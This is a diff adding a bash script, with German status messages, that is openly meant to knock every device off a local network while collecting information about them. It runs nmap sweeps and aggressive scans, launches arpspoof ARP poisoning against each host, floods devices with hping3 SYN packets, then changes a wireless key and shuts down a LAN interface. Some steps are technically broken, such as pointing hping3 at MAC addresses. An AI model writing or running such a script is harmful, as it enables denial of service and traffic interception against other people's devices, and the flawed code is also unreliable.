@@ -1,0 +1,32 @@
+#!/bin/bash
+echo "Alle Geräte aus dem Netzwerk entfernen und überlasten, während Informationen gesammelt werden..."
+sleep 5
+nmap -sP 192.168.1.0/24 | grep "Nmap scan report for" | cut -d " " -f 5 | while read host; do
+    echo "Speichere Informationen über $host..."
+    mkdir -p "/root/network-scan/$host"
+    nmap -A -v -T4 $host > "/root/network-scan/$host/nmap.txt"
+    arp -a | grep "$host" > "/root/network-scan/$host/arp.txt"
+    echo "Deaktiviere $host und überlaste es mit Anfragen..."
+    arpspoof -i eth0 -t $host 192.168.1.1 &
+done
+echo "Fertig!"
+
+echo "Sende Anfragen an alle verbundenen Geräte..."
+connected_devices=$(arp-scan --interface=wlan0 --localnet | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
+for device in $connected_devices; do
+    echo "Sende Anfragen an $device..."
+    hping3 -S -p 80 -c 50000 $device &
+done
+
+echo "Warte bis alle Geräte getrennt sind..."
+while true; do
+    connected_devices=$(arp-scan --interface=wlan0 --localnet | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
+    if [[ -z $connected_devices ]]; then
+        break
+    fi
+done
+
+echo "Ändere das Passwort auf 'passwort' und deaktiviere alle LAN-Ports..."
+iwconfig wlan0 essid "Mein Netzwerk" key s:passwort
+ifconfig eth0 down
+echo "Passwort geändert und alle LAN-Ports deaktiviert."
